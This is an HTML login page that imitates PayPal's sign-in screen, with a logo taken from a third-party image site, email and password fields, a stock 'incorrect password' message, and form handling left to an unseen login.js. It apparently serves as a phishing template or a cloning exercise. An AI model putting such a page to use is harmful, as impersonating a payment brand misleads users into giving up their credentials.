<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>PayPal Login</title>
  <link rel="stylesheet" href="login.css">
</head>
<body>
  <div class="login-container">
    <img src="https://pngimg.com/d/paypal_PNG7.png" alt="PayPal Logo" class="logo">
    <h2>Log in to your PayPal account</h2>
    <form id="loginForm">
      <div class="form-group">
        <input type="text" id="email" placeholder="Email or Mobile Number" required>
      </div>
      <div class="form-group">
        <input type="password" id="password" placeholder="Password" required>
      </div>
      <button class="btn" type="submit">Log In</button>
      <a href="#" class="link">Having trouble logging in?</a>
      <a href="#" class="link">Sign Up</a>
    </form>
    <div id="errorMessage" class="error-message">The email or password you entered is incorrect.</div>
    <div class="footer">
      <p>Privacy | Legal | Contact</p>
    </div>
  </div>

  <script src="login.js"></script>
</body>
</html>
